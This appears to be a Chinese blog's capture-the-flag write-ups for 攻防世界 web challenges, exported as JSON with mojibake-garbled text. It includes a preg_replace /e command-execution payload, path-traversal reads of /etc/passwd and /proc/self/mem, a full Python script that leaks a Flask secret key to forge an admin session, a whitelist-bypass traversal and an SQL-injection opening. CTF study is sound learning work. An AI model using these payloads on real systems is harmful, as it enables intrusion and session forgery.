&amp;&amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } ?&gt; é‡è¦ä»£ç å¦‚ä¸Šï¼Œå…ˆè§£é‡Šä¸€äº›ä¸å¸¸è§å‡½æ•°çš„å«ä¹‰ preg_replace â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚ preg_replace($pattern, $replacement, $subject)å‡½æ•°å°†subjectä¸­åŒ¹é…åˆ°çš„replacementç”¨patternæ›¿æ¢ï¼Œå¦‚æœå¯ç”¨/eå‚æ•°çš„è¯ï¼Œå°±ä¼šå°†replacementå½“åšphpä»£ç æ‰§è¡Œã€‚ $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€æ­£åˆ™ã€‚ $replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚ $subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚ /e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘ å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚ æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚ è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†wpå‘ç°æ­¤å¤„ç«Ÿç„¶å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œå½“æ—¶åˆ†æäº†åŠå¤©ä¸çŸ¥é“ä»å“ªå…¥æ‰‹ã€‚ã€‚ã€‚ã€‚ è¯´æ˜æˆ‘ä»¬è¦ç»™httpçš„å¤´éƒ¨æ·»åŠ X-forwarded-For=127.0.0.1ï¼Œå³å¯åˆ©ç”¨ä¸Šè¿°çš„å‡½æ•°ï¼Œbpä¿®æ”¹ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œæˆ‘ç”¨hackbarä¿®æ”¹ æˆåŠŸæ‰§è¡Œç¬¬ä¸€æ­¥ æ ¹æ®è¯¥å‡½æ•°çš„ç‰¹æ€§æˆ‘ä»¬æ„é€ å¦‚ä¸‹paylaodï¼š ?pat=/abc/e&amp;rep=&lt;?php system('ls');?&gt;&amp;sub=abc //æ­¤å¤„patä¸­çš„abcå‰æœ‰æ–œæ çš„åŸå› æ˜¯ï¼Œç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´ï¼Œä»¥åŒ¹é…subä¸­çš„abc æŸ¥çœ‹å¯ä»¥æ–‡ä»¶s3chachaDir è¿™é‡Œä¼°è®¡flagè¿˜æ˜¯æ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆå†æ¬¡lsçœ‹çœ‹ å¦‚æ­¤ï¼Œcatä¸€ä¸‹å³å¯ï¼ŒF12çœ‹åˆ°flag å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ ä¼ªåè®®å‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-lottery","path":"/2023/08/17/lottery/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢ï¼Œå‘ç°æ˜¯ä¸€ä¸ªä¹°ä¸œè¥¿çš„ç½‘ç«™ï¼Œç‚¹å‡»playä¹‹åè®©æˆ‘ä»¬æ³¨å†Œè´¦å·ï¼Œè¿™é‡Œéšä¾¿ä¸€ä¸ªå³å¯ï¼Œæ³¨å†Œå®Œä»¥åæµè§ˆä¸€ä¸‹ å‘ç°åœ¨è¯¥é¡µé¢ä¸‹ï¼Œåªæœ‰æ”’å¤Ÿé’±æ‰èƒ½ä¹°flagï¼Œä¸å‡ºæ„å¤–å°±æ˜¯é€»è¾‘æ¼æ´äº†ï¼Œç»“åˆé¢˜ç›®ç»™çš„é™„ä»¶ï¼Œä¹Ÿå°±æ˜¯æºä»£ç ï¼Œæˆ‘ä»¬å…ˆåœ¨è´­ä¹°é¡µé¢éšä¾¿è´­ä¹°ï¼Œçœ‹çœ‹ç½‘ç«™æµé‡çš„åŠ¨å‘ é‚£ä¹ˆæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹api.php åœ¨è¿™é‡Œå‘ç°ï¼Œä»–å°†æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¸äº§ç”Ÿçš„éšæœºæ•°è¿›è¡Œæ¯”è¾ƒï¼Œæ¯”è¾ƒç›¸åŒæ•°å­—çš„ä¸ªæ•°ï¼Œè¿›è¡Œå¯¹åº”é’±æ•°çš„å¢åŠ ï¼Œè¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œç”¨çš„æ˜¯å¼±æ¯”è¾ƒï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œè¿‡æ»¤ è¿™é‡Œæ³¨æ„ä¸€ä¸ªPHPç‰¹æ€§ï¼šå¸ƒå°”å€¼trueå’Œä»»æ„å­—ç¬¦ä¸²éƒ½å¼±ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0ä¹Ÿè®¤ä¸ºæ˜¯bool falseï¼Œtrueæ˜¯ä¸ç­‰äºfalseçš„ï¼Œä¾‹å¦‚ var_dump(true==\"hyuf\") //true var_dump(True == 0); //bool(false) var_dump(True == 'False'); //bool(true) var_dump(True == 2); //bool(true) ç”±æ­¤ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä»¤è¾“å…¥çš„å†…å®¹ä¸ºä¸€ä¸ªåŒ…å«7ä¸ªtrueå…ƒç´ çš„æ•°ç»„ï¼Œè¿™æ ·æˆ‘ä»¬è´¦æˆ·çš„ä½™é¢ä¸€å®šæ˜¯å¢åŠ çš„ï¼Œæˆ‘ä»¬ç›´æ¥æŠ“åŒ…ä¿®æ”¹ æ‹¿åˆ°flag æ–‡ç« å‚è€ƒï¼š wpå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-catcat-new","path":"/2023/08/16/catcat-new/","content":"é¢˜ç›®æè¿°ï¼š catcat é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¦–é¡µéšä¾¿ç‚¹å‡»ä¸€ä¸ªå›¾ç‰‡ï¼Œçœ‹åˆ°urlå¦‚å›¾ï¼ŒçŒœæµ‹å°±æ˜¯æ–‡ä»¶åŒ…å«äº†ï¼Œæµ‹è¯•äº†åŠå¤©æ²¡å•¥å¤´ç»ªï¼Œè¿˜æ˜¯çœ‹wpå§ã€‚ã€‚ã€‚ çœ‹äº†ä¹‹åå‘ç°è¿™æ˜¯ä¸ä¼šçš„ç‚¹ï¼Œé‚£æˆ‘ä»¬è®¤çœŸå­¦ä¹ ä¸€ç•ª æ–‡ç« è¯´ï¼šä¸€é“æœ‰å…³ä»»æ„æ–‡ä»¶è¯»å–ï¼ŒLinuxæ•æ„Ÿæ–‡ä»¶ï¼Œflask-sessionä¼ªé€ çš„é¢˜ç›® å…ˆçœ‹åŸºç¡€çŸ¥è¯† 1./etc/passwd è¯¥æ–‡ä»¶å‚¨å­˜äº†è¯¥Linuxç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œåªæœ‰rootæƒé™æ‰å¯ä»¥ä¿®æ”¹ã€‚å…¶å…·ä½“æ ¼å¼ä¸º ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shellï¼ˆä»¥å†’å·ä½œä¸ºåˆ†éš”ç¬¦ï¼‰ 2./proc/self procæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæä¾›äº†å†…æ ¸æ•°æ®ç»“æ„çš„æ¥å£ã€‚å†…æ ¸æ•°æ®æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶å­˜å‚¨åœ¨å†…éƒ¨åŠå¯¼ä½“å­˜å‚¨å™¨ä¸­çš„æ•°æ®ã€‚é€šè¿‡/proc/PIDå¯ä»¥è®¿é—®å¯¹åº”PIDçš„è¿›ç¨‹å†…æ ¸æ•°æ®ï¼Œè€Œ/proc/selfè®¿é—®çš„æ˜¯å½“å‰è¿›ç¨‹çš„å†…æ ¸æ•°æ®ã€‚ 3./proc/self/cmdline è¯¥æ–‡ä»¶åŒ…å«çš„å†…å®¹ä¸ºå½“å‰è¿›ç¨‹æ‰§è¡Œçš„å‘½ä»¤è¡Œå‚æ•°ã€‚ 4./proc/self/mem /proc/self/memæ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜æ•°æ®ã€‚ä½†æ˜¯æ³¨æ„è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œå› ä¸ºæ–‡ä»¶ä¸­å­˜åœ¨ç€ä¸€äº›æ— æ³•è¯»å–çš„æœªè¢«æ˜ å°„åŒºåŸŸã€‚æ‰€ä»¥è¦ç»“åˆ/proc/self/mapsä¸­çš„åç§»åœ°å€è¿›è¡Œè¯»å–ã€‚é€šè¿‡å‚æ•°startå’ŒendåŠåç§»åœ°å€å€¼è¯»å–å†…å®¹ã€‚ 5./proc/self/maps /proc/self/mapsåŒ…å«çš„å†…å®¹æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå¯é€šè¿‡è¯»å–è¯¥æ–‡ä»¶æ¥å¾—åˆ°å†…å­˜æ•°æ®æ˜ å°„çš„åœ°å€ã€‚ 6.flask-sessionç»“æ„ flask_sessionæ˜¯flaskæ¡†æ¶å®ç°sessionåŠŸèƒ½çš„ä¸€ä¸ªæ’ä»¶ã€‚å…¶sessionç»“æ„åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šåºåˆ—åŒ–å†…å®¹+æ—¶é—´+é˜²ç¯¡æ”¹å€¼ï¼Œè¿™ä¸‰éƒ¨åˆ†å†…å®¹åŠ å¯†åä»¥ç¬¦å· â€œ.â€æ¥è¿›è¡Œåˆ†éš”ã€‚flask_sessioné»˜è®¤sessionçš„å‚¨å­˜æ˜¯åœ¨ç”¨æˆ·Cookieä¸­ã€‚ä½†ä¹Ÿå¯ä»¥æŒ‡å®šå­˜å‚¨åœ¨æ•°æ®åº“ï¼Œç¼“å­˜ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ç­‰ä¹‹ä¸­ã€‚ è¾“å…¥è¯¥payloadï¼š?file=../../../etc/passwdï¼Œç¡®å®å­˜åœ¨æ¼æ´ è¯»å–å½“å‰è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ã€‚?file=../../../../proc/self/cmdlineï¼Œå‘ç°æœ‰ä¸€ä¸ªé€šè¿‡pythonå¯åŠ¨app.pyçš„å‘½ä»¤ã€‚ æ‰€ä»¥å¯ä»¥å¾—å‡ºè¯¥ç½‘ç«™ä½¿ç”¨Pythonæ¡†æ¶ï¼Œå¹¶ä¸”å› ä¸ºæœ‰app.pyå¯çŸ¥ä½¿ç”¨çš„æ˜¯flaskæ¡†æ¶ã€‚ å°è¯•è¯»å–app.pyæ–‡ä»¶ã€‚ å¤åˆ¶æ–‡æœ¬å†…å®¹ï¼Œå°†å­—ç¬¦ä¸²f-stringæ ¼å¼åŒ–è¾“å‡ºç¾åŒ–ä¸€ä¸‹ã€‚ import os import uuid from flask import Flask, request, session, render_template, Markup from cat import cat flag = \"\" app = Flask( #è¿™éƒ¨åˆ†ä»£ç å¯¼å…¥äº†æ‰€éœ€çš„æ¨¡å—ï¼Œå…¶ä¸­åŒ…æ‹¬Flaskã€osã€uuidç­‰ã€‚åˆ›å»ºäº†ä¸€ä¸ªFlaskåº”ç”¨å®ä¾‹ï¼Œå¹¶è®¾ç½®äº†é™æ€èµ„æºè·¯å¾„ã€‚ __name__, static_url_path='/', static_folder='static' ) app.config['SECRET_KEY'] = str(uuid.uuid4()).replace(\"-\", \"\") + \"*abcdefgh\" # æ­¤å¤„åˆ©ç”¨uuid.uuid4()ç”Ÿæˆäº†ä¸€ä¸²idå­—ç¬¦ä¸²å¹¶åœ¨åé¢æ‹¼æ¥*abcdefgh if os.path.isfile(\"/flag\"): # å¯¼å…¥flagæ–‡ä»¶å¹¶åˆ é™¤æ‰ï¼Œcatå‡½æ•°ä½œç”¨æ˜¯è¯»å–flagå†…å®¹ï¼Œèµ‹å€¼ç»™flagå˜é‡ flag = cat(\"/flag\") os.remove(\"/flag\") @app.route('/', methods=['GET']) # / è·¯å¾„çš„å¤„ç†å‡½æ•°ç”¨äºæ¸²æŸ“é¦–é¡µæ¨¡æ¿ï¼Œå±•ç¤ºå¯ç”¨çš„\"cat\"åˆ—è¡¨ã€‚ def index(): detailtxt = os.listdir('./details/') cats_list = [] for i in detailtxt: cats_list.append(i[:i.index('.')]) return render_template(\"index.html\", cats_list=cats_list, cat=cat) @app.route('/info', methods=[\"GET\", 'POST'])# def info(): # /info è·¯å¾„çš„å¤„ç†å‡½æ•°æ¥æ”¶GETæˆ–POSTè¯·æ±‚ï¼Œä»\"./details/\"ç›®å½•ä¸‹è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶åœ¨è¯¦æƒ…é¡µå±•ç¤ºã€‚ filename = \"./details/\" + request.args.get('file', \"\") start = request.args.get('start', \"0\") end = request.args.get('end', \"0\") name = request.args.get('file', \"\")[:request.args.get('file', \"\").index('.')] return render_template(\"detail.html\", catname=name, info=cat(filename, start, end)) @app.route('/admin', methods=[\"GET\"]) # åœ¨sessionä¿¡æ¯ä¸­admin=1çš„ç”¨æˆ·åœ¨/adminè·¯å¾„ä¸‹è®¿é—®ç½‘ç«™å¯ä»¥è·å¾—flagï¼Œæ‰€ä»¥è¦ä¼ªé€ sessionã€‚ def admin_can_list_root(): if session.get('admin') == 1: return flag else: session['admin'] = 0 return \"NoNoNo\" if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=5637) ä»¥ä¸Šå°±æ˜¯app.pyçš„ä»£ç  flask_sessionçš„ä¼ªé€ éœ€è¦ç”¨åˆ°secret_keyï¼Œè€Œsecret_keyçš„å€¼å¯ä»¥é€šè¿‡å†…å­˜æ•°æ®è·å–ã€‚å…ˆè¯»å–/proc/self/mapsæ–‡ä»¶è·å–å¯è¯»å†…å®¹çš„å†…å­˜æ˜ å°„åœ°å€ã€‚ æ‰§è¡Œç ´è§£è„šæœ¬ # coding=utf-8 # ---------------------------------- ################################### # Edited by lx56@blog.lxscloud.top ################################### # ---------------------------------- import requests import re import ast, sys from abc import ABC from flask.sessions import SecureCookieSessionInterface url = \"http://61.147.171.105:62610/\" # æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Š if sys.version_info[0] &lt; 3: # &lt; 3.0 raise Exception('Must be using at least Python 3') # ----------------session ä¼ªé€ ,å•ç‹¬ç”¨ä¹Ÿå¯ä»¥è€ƒè™‘è¿™ä¸ªåº“ï¼š https://github.com/noraj/flask-session-cookie-manager ---------------- class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key class FSCM(ABC): def encode(secret_key, session_cookie_structure): # Encode a Flask session cookie try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e # ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret key s_key = \"\" bypass = \"../..\" # è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å– map_list = requests.get(url + f\"info?file={bypass}/proc/self/maps\")# è¯»å–å½“å‰è¿›ç¨‹å†…å®¹ map_list = map_list.text.split(\"\\ \") # ä»¥æ¢è¡Œç¬¦åˆ†å¼€å†…å®¹ for i in map_list: # åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€ map_addr = re.match(r\"([a-z0-9]+)-([a-z0-9]+) rw\", i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(\"Found rw addr:\", start, \"-\", end) # è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem res = requests.get(f\"{url}/info?file={bypass}/proc/self/mem&amp;start={start}&amp;end={end}\") # ç”¨åˆ°äº†ä¹‹å‰ç‰¹å®šçš„SECRET_KEYæ ¼å¼ã€‚å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey if \"*abcdefgh\" in res.text: # æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh secret_key = re.findall(\"[a-z0-9]{32}\\*abcdefgh\", res.text) if secret_key: print(\"Secret Key:\", secret_key[0]) s_key = secret_key[0] break æœ‰äº†secret_keyåæ¥ä¸‹æ¥å°±æ˜¯ä¼ªé€ sessionï¼Œsessionåœ¨è®¿é—®/adminè·¯å¾„æ—¶çš„cookieä¸­ã€‚sessionä¸ºeyJhZG1pbiI6MH0.ZNzhIg.Z7MhkPlaNm3hajdIBv_AEL995xo ä½¿ç”¨å·¥å…·flask_session_cookie_managerä¼ªé€ sessionã€‚ä½¿ç”¨æ–¹æ³•ä¸ºï¼š è§£å¯† python flask_session_cookie_manager3.py decode -s â€œsecret_keyâ€ -c â€œsessionâ€ åŠ å¯† python flask_session_cookie_manager3.py encode -s â€œsecret_keyâ€ -t â€œdataâ€ æ‰§è¡Œå¦‚ä¸‹payload python flask_session_cookie_manager3.py decode -s \"bd07849f5c4e4359843eb39758e389f0*abcdefgh\" -c \"eyJhZG1pbiI6MH0.ZNznXw.gl2UUGVxRJ7z7FgWD-jlsS_ETPE\" python flask_session_cookie_manager3.py encode -s \"bd07849f5c4e4359843eb39758e389f0*abcdefgh\" -t \"{'admin': 1}\" python flask_session_cookie_manager3.py encode -s â€œbd07849f5c4e4359843eb39758e389f0*abcdefghâ€ -t â€œ{'admin': 1}â€ å¾—åˆ°ä¼ªé€ çš„sessionï¼Œä½¿ç”¨burpsuiteæ›´æ”¹sessionå¹¶æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚ è¿™é‡Œä¸çŸ¥ä¸ºä½•ï¼Œæˆ‘è®¤ä¸ºæˆ‘æ­¥éª¤ä¸€æ ·çš„ï¼Œä½†æ˜¯å¤ç°ä¸å‡ºæ¥ï¼Œæœ€åæ‰¾äº†ä¸€ä¸ªä¸€æŠŠæ¢­çš„è„šæœ¬ï¼Œä¾æ—§æ˜¯nononoï¼Œå› è€Œä¸çº ç»“äº†ï¼ŒçŸ¥é“æ€è·¯å³å¯ ä¸Šè¿°è„šæœ¬ä¹Ÿæ˜¯åªèƒ½çœ‹æ‡‚ï¼Œæ ¹æœ¬ä¸ä¼šå†™ã€‚ã€‚ã€‚ã€‚åªå¸Œæœ›æœªæ¥ä¸åœ¨æ˜¯è„šæœ¬å°å­äº† çŸ¥è¯†æ€»ç»“ï¼š flask_sessionä¼ªé€  ä¼ªé€ åŸç† flaskçš„sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œè€Œä¸”flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚ é€šå¸¸æƒ…å†µä¸‹ä¼šå’ŒSSTIçŸ¥è¯†ç‚¹åŒæ­¥è€ƒå¯Ÿã€‚ åˆ©ç”¨æ–¹å¼ æˆ‘ä»¬å¯ä»¥ç”¨pythonè„šæœ¬æŠŠflaskçš„sessionè§£å¯†å‡ºæ¥ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„sessionçš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“flaskç”¨æ¥ç­¾åçš„SECRET_KEY åŠ è§£å¯†è„šæœ¬è‡ªå–ï¼š https://github.com/noraj/flask-session-cookie-manager ä½¿ç”¨æ–¹æ³• python2 è„šæœ¬2.py decode -c \"sessionå€¼\" -s \"keyå€¼\" python2 è„šæœ¬2.py encode -s \"keyå€¼\" -t \"æˆ‘ä»¬éœ€è¦ä¼ªé€ çš„å€¼\" python3 è„šæœ¬3.py decode -c \"sessionå€¼\" -s \"keyå€¼\" python3 è„šæœ¬3.py encode -s \"keyå€¼\" -t \"æˆ‘ä»¬éœ€è¦ä¼ªé€ çš„å€¼\" æ‰€éœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯pythonçš„ç‰ˆæœ¬ä¸åŒæ‰€å¯¹åº”çš„è„šæœ¬ä¹Ÿä¸ç›¸åŒã€‚ Flaskçš„sessionæ ¼å¼ base64åŠ å¯†çš„Sessionæ•°æ®(ç»è¿‡äº†jsonã€zlibå‹ç¼©å¤„ç†çš„å­—ç¬¦ä¸²) . æ—¶é—´æˆ³ . ç­¾å æ—¶é—´æˆ³ç”¨æ¥å‘Šè¯‰æœåŠ¡ç«¯æ•°æ®æœ€åä¸€æ¬¡æ›´æ–°çš„æ—¶é—´ï¼Œè¶…è¿‡31å¤©çš„ä¼šè¯ï¼Œå°†ä¼šè¿‡æœŸï¼Œå˜ä¸ºæ— æ•ˆä¼šè¯ï¼›ç­¾åæ˜¯åˆ©ç”¨Hmacç®—æ³•ï¼Œå°†sessionæ•°æ®å’Œæ—¶é—´æˆ³åŠ ä¸Šsecret_keyåŠ å¯†è€Œæˆçš„ï¼Œç”¨æ¥ä¿è¯æ•°æ®æ²¡æœ‰è¢«ä¿®æ”¹ã€‚ ç”±ä¸Šæ–‡æ‰€è¿°çš„sessionæ ¼å¼å¯çŸ¥ï¼Œè¦ä¿®æ”¹å¹¶ä¼ªé€ ä¸€ä¸ªsessionçš„å¿…è¦æ¡ä»¶å°±æ˜¯çŸ¥é“åŠ å¯†æ‰€é‡‡ç”¨çš„secret_keyï¼Œä¸€æ—¦è·å–åˆ°secret_key, æˆ‘ä»¬å°±å¯ä»¥è½»æ¾çš„æ„é€ ç­¾åï¼Œä»è€Œå®ç°å®¢æˆ·ç«¯çš„sessionçš„ä¼ªé€ ã€‚ æ–‡ç« å‚è€ƒï¼š å‚è€ƒä¸€ å‚è€ƒäºŒ å‚è€ƒä¸‰","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-warmup","path":"/2023/08/16/warmup/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ¥åˆ°é¡µé¢å‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œé‚£ä¹ˆæŸ¥çœ‹æºä»£ç çœ‹çœ‹ å¾ˆæ˜æ˜¾äº†ï¼Œè®¿é—®ä¸€ä¸‹çœ‹çœ‹ é‚£ä¹ˆå°±æ˜¯ä»£ç å®¡è®¡äº† &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; //è®¾ç½®ç™½åå• if (! isset($page) || !is_string($page)) { //åˆ¤æ–­pageæ˜¯å¦å­˜åœ¨ä¸”æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { //åˆ¤æ–­pageæ˜¯å¦åœ¨ç™½åå•ä¸­ return true; } $_page = mb_substr( //æˆªå–pageå˜é‡?ä¹‹å‰çš„å†…å®¹ $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { //äºŒæ¬¡åˆ¤æ–­ç™½åå• return true; } $_page = urldecode($page); //urlè§£ç  $_page = mb_substr( //äºŒæ¬¡?æˆªå– $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) {//ä¸‰æ¬¡åˆ¤æ–­ç™½åå• return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file'])//è‹¥fileå˜é‡å­˜åœ¨ä¸”ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œä¸”åœ¨checkå‡½æ•°ä¸­è¿”å›trueï¼Œåˆ™åŒ…å«fileå˜é‡çš„å†…å®¹ &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; } ?&gt; å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬è¿™é‡Œä¸»è¦æ˜¯ç»•è¿‡ç™½åå•æ£€æµ‹å³å¯ä¹Ÿå°±æ˜¯in_arrayå‡½æ•°ï¼Œä½†æˆ‘åˆšåšçš„æ—¶å€™ï¼Œä¸€ç›´ä»¥ä¸ºè¦é PHPç‰¹æ€§ç»•è¿‡inarrayå‡½æ•°ï¼Œæ¯”å¦‚åœ¨åé¢åŠ ä¸ª#ä¹‹ç±»çš„ï¼Œä½†èµ°äº†ä¸€éä¼¼ä¹æ²¡å•¥ç”¨ï¼Œçœ‹äº†wpæ‰é†’æ‚Ÿï¼Œè¿™é‡Œé includeç‰¹æ€§å³å¯ï¼Œä¹Ÿå°±æ˜¯ç›®å½•ç©¿è¶Šã€‚ å½“ç„¶è¿™é‡Œå…ˆçœ‹çœ‹hintæç¤º æ‰¾åˆ°flagæ‰€åœ¨åœ° è¿™é‡Œæˆ‘ä»¬åˆ†æå¾—çŸ¥æˆ‘ä»¬åº”è¯¥è®©ç¬¬ä¸€æ¬¡arrayæ£€æŸ¥è¿”å›falseï¼Œéšååˆ°ç¬¬äºŒä¸ªarrayæ£€æŸ¥ï¼Œè¿™é‡Œæˆªå–?ä¹‹å‰çš„å†…å®¹ï¼Œæˆ‘ä»¬ä»¤è¿™ä¸€æ­¥è¿”å›trueï¼Œé‚£ä¹ˆå°±ä¸ç”¨ç®¡ç¬¬ä¸‰ä¸ªarrayæ£€æŸ¥äº† æ„é€ payloadå¦‚ä¸‹ï¼š ?file=source.php?ffffllllaaaagggg ç»“æœæ²¡æœ‰ä»»ä½•ååº”ï¼Œé‚£å°±æ˜¯ç›®å½•é—®é¢˜äº†ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹includeç‰¹æ€§ ç”±æ­¤å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬åœ¨?åé¢åŠ ä¸Šç›¸å¯¹è·¯å¾„â€¦/ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šåœ¨å½“å‰ç›®å½•å¼€å§‹å¯»æ‰¾è€Œå¿½ç•¥ä¹‹å‰çš„source.php åé¢å°±æ˜¯å°è¯•äº†ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ ?file=source.php?../../../../../ffffllllaaaagggg æ‹¿åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-supersqli","path":"/2023/08/14/supersqli/","content":"é¢˜ç›®æè¿°ï¼š éšä¾¿æ³¨ é¢˜ç›®è§£é¢˜ï¼š æ ¹æ®é¢˜ç›®å¾ˆæ˜¾ç„¶æ˜¯sqlæ³¨å…¥äº† æˆ‘ä»¬æ‰“å¼€é¢˜ç›®çœ‹çœ‹ æ­£å¸¸è¾“å…¥1ï¼Œä¹Ÿæ­£å¸¸å›æ˜¾ï¼Œéšä¹‹è¾“å…¥1â€™å‘ç°æŠ¥é”™ï¼Œè¯å®å­˜åœ¨sqlæ³¨å…¥ï¼Œä¸”ä¸ºå•å¼•å·é—­åˆ 